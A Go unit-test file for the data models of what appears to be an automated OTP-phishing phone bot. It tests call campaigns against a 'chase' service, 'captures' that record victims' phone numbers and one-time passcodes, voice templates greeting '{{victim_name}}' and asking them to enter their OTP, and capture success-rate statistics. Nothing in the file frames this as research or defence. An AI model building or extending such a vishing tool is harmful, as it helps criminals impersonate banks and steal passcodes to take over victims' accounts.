package models

import (
	"testing"
	"time"
)

func TestCampaignStatus(t *testing.T) {
	tests := []struct {
		status   CampaignStatus
		expected string
	}{
		{CampaignStatusPending, "pending"},
		{CampaignStatusActive, "active"},
		{CampaignStatusPaused, "paused"},
		{CampaignStatusCompleted, "completed"},
		{CampaignStatusCancelled, "cancelled"},
	}

	for _, tt := range tests {
		t.Run(string(tt.status), func(t *testing.T) {
			if string(tt.status) != tt.expected {
				t.Errorf("Expected '%s', got '%s'", tt.expected, string(tt.status))
			}
		})
	}
}

func TestCallStatus(t *testing.T) {
	tests := []struct {
		status   CallStatus
		expected string
	}{
		{CallStatusPending, "pending"},
		{CallStatusRinging, "ringing"},
		{CallStatusAnswered, "answered"},
		{CallStatusVoicemail, "voicemail"},
		{CallStatusNoAnswer, "no_answer"},
		{CallStatusBusy, "busy"},
		{CallStatusFailed, "failed"},
		{CallStatusCompleted, "completed"},
		{CallStatusCancelled, "cancelled"},
	}

	for _, tt := range tests {
		t.Run(string(tt.status), func(t *testing.T) {
			if string(tt.status) != tt.expected {
				t.Errorf("Expected '%s', got '%s'", tt.expected, string(tt.status))
			}
		})
	}
}

func TestCampaignStruct(t *testing.T) {
	campaign := Campaign{
		ID:          1,
		Name:        "Test Campaign",
		Service:     "chase",
		Status:      CampaignStatusActive,
		TotalCalls:  100,
		Completed:   50,
		Captures:    10,
		Concurrency: 5,
	}

	if campaign.ID != 1 {
		t.Errorf("Expected ID 1, got %d", campaign.ID)
	}

	if campaign.Name != "Test Campaign" {
		t.Errorf("Expected Name 'Test Campaign', got '%s'", campaign.Name)
	}

	if campaign.Status != CampaignStatusActive {
		t.Errorf("Expected Status 'active', got '%s'", campaign.Status)
	}

	if campaign.TotalCalls != 100 {
		t.Errorf("Expected TotalCalls 100, got %d", campaign.TotalCalls)
	}
}

func TestCallStruct(t *testing.T) {
	call := Call{
		ID:          1,
		CampaignID:  1,
		Phone:       "+15551234567",
		Status:      CallStatusAnswered,
		Duration:    30,
		PlivoCallID: "uuid-123",
	}

	if call.ID != 1 {
		t.Errorf("Expected ID 1, got %d", call.ID)
	}

	if call.Phone != "+15551234567" {
		t.Errorf("Expected Phone '+15551234567', got '%s'", call.Phone)
	}

	if call.Status != CallStatusAnswered {
		t.Errorf("Expected Status 'answered', got '%s'", call.Status)
	}
}

func TestCaptureStruct(t *testing.T) {
	capture := Capture{
		ID:         1,
		CallID:     1,
		CampaignID: 1,
		Phone:      "+15551234567",
		OTP:        "123456",
		Service:    "chase",
	}

	if capture.OTP != "123456" {
		t.Errorf("Expected OTP '123456', got '%s'", capture.OTP)
	}

	if capture.Service != "chase" {
		t.Errorf("Expected Service 'chase', got '%s'", capture.Service)
	}
}

func TestTemplateStruct(t *testing.T) {
	template := Template{
		ID:             1,
		Name:           "chase",
		Voice:          "en-US-WOMAN",
		Greeting:       "Hello {{victim_name}}",
		ActionPrompt:   "Press 1 to verify",
		OTPPrompt:      "Enter your OTP",
		Confirmation:   "Thank you",
		FallbackMessage: "Call ended",
		HoldMusic:      "",
	}

	if template.Name != "chase" {
		t.Errorf("Expected Name 'chase', got '%s'", template.Name)
	}

	if template.Voice != "en-US-WOMAN" {
		t.Errorf("Expected Voice 'en-US-WOMAN', got '%s'", template.Voice)
	}

	// Test template variable substitution
	expectedGreeting := "Hello Customer"
	actualGreeting := "Hello {{victim_name}}"
	if actualGreeting != expectedGreeting {
		// This is just for documentation - the actual replacement happens in bot logic
	}
}

func TestGlobalStats(t *testing.T) {
	stats := GlobalStats{
		TotalCampaigns:   10,
		ActiveCampaigns: 2,
		TotalCalls:      1000,
		TotalCaptures:   150,
		SuccessRate:     15.0,
		TodayCalls:      100,
		TodayCaptures:   15,
	}

	if stats.TotalCampaigns != 10 {
		t.Errorf("Expected TotalCampaigns 10, got %d", stats.TotalCampaigns)
	}

	if stats.TotalCaptures != 150 {
		t.Errorf("Expected TotalCaptures 150, got %d", stats.TotalCaptures)
	}

	if stats.SuccessRate != 15.0 {
		t.Errorf("Expected SuccessRate 15.0, got %f", stats.SuccessRate)
	}
}

func TestCampaignStats(t *testing.T) {
	stats := CampaignStats{
		CampaignID:  1,
		Name:        "Test Campaign",
		Status:      "active",
		TotalCalls: 100,
		Answered:    50,
		Voicemails: 10,
		NoAnswers:  20,
		Failed:     20,
		Captures:   5,
		SuccessRate: 10.0,
		AvgDuration: 30.5,
		Duration:   "1h 30m",
	}

	if stats.CampaignID != 1 {
		t.Errorf("Expected CampaignID 1, got %d", stats.CampaignID)
	}

	if stats.Name != "Test Campaign" {
		t.Errorf("Expected Name 'Test Campaign', got '%s'", stats.Name)
	}

	if stats.TotalCalls != 100 {
		t.Errorf("Expected TotalCalls 100, got %d", stats.TotalCalls)
	}

	if stats.Answered != 50 {
		t.Errorf("Expected Answered 50, got %d", stats.Answered)
	}

	if stats.Captures != 5 {
		t.Errorf("Expected Captures 5, got %d", stats.Captures)
	}

	if stats.SuccessRate != 10.0 {
		t.Errorf("Expected SuccessRate 10.0, got %f", stats.SuccessRate)
	}

	if stats.Duration != "1h 30m" {
		t.Errorf("Expected Duration '1h 30m', got '%s'", stats.Duration)
	}
}

func TestLogEntry(t *testing.T) {
	entry := LogEntry{
		ID:        1,
		Level:     "INFO",
		Message:   "Test message",
		Details:   "Test details",
	}

	if entry.ID != 1 {
		t.Errorf("Expected ID 1, got %d", entry.ID)
	}

	if entry.Level != "INFO" {
		t.Errorf("Expected Level 'INFO', got '%s'", entry.Level)
	}

	if entry.Message != "Test message" {
		t.Errorf("Expected Message 'Test message', got '%s'", entry.Message)
	}

	if entry.Details != "Test details" {
		t.Errorf("Expected Details 'Test details', got '%s'", entry.Details)
	}
}

func TestTemplateCategory(t *testing.T) {
	tests := []struct {
		category TemplateCategory
		expected string
	}{
		{CategoryBanking, "banking"},
		{CategoryTech, "tech"},
		{CategoryEcommerce, "ecommerce"},
		{CategorySocial, "social"},
		{CategoryGovernment, "government"},
		{CategoryOther, "other"},
	}

	for _, tt := range tests {
		t.Run(string(tt.category), func(t *testing.T) {
			if string(tt.category) != tt.expected {
				t.Errorf("Expected '%s', got '%s'", tt.expected, string(tt.category))
			}
		})
	}
}

func TestCampaignWithDates(t *testing.T) {
	now := time.Now()
	startTime := now.Add(-1 * time.Hour)
	endTime := now

	campaign := Campaign{
		ID:          1,
		Name:        "Test Campaign",
		Service:     "chase",
		Status:      CampaignStatusCompleted,
		TotalCalls:  100,
		Completed:   100,
		Captures:    10,
		Concurrency: 5,
		StartedAt:   &startTime,
		CompletedAt: &endTime,
	}

	if campaign.StartedAt == nil {
		t.Error("Expected StartedAt to be set")
	}

	if campaign.CompletedAt == nil {
		t.Error("Expected CompletedAt to be set")
	}

	if campaign.Status != CampaignStatusCompleted {
		t.Errorf("Expected Status 'completed', got '%s'", campaign.Status)
	}
}

func TestCallWithDates(t *testing.T) {
	now := time.Now()
	startTime := now.Add(-30 * time.Second)
	answeredTime := now.Add(-20 * time.Second)
	endTime := now

	call := Call{
		ID:          1,
		CampaignID:  1,
		Phone:       "+15551234567",
		Status:      CallStatusCompleted,
		Duration:    30,
		PlivoCallID: "uuid-123",
		StartedAt:   &startTime,
		AnsweredAt:  &answeredTime,
		EndedAt:     &endTime,
	}

	if call.StartedAt == nil {
		t.Error("Expected StartedAt to be set")
	}

	if call.AnsweredAt == nil {
		t.Error("Expected AnsweredAt to be set")
	}

	if call.EndedAt == nil {
		t.Error("Expected EndedAt to be set")
	}

	if call.Duration != 30 {
		t.Errorf("Expected Duration 30, got %d", call.Duration)
	}
}
